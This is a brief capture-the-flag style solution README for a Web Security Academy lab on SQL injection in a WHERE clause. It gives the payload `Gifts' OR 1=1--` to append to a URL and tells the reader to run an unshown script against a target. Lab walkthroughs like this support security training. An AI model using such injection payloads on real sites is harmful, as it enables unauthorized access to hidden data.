# SQL Injection Lab 01 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Manual Solution

1. Open the lab in Web Security Academy.
2. Add the following to the URL: `filter?category=Gifts' OR 1=1--`
3. Press Enter.
4. You will see the SQL Injection successful message.

## Automated Solution

1. Download the script
2. Run the script with the following command: python sqli_lab_01.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

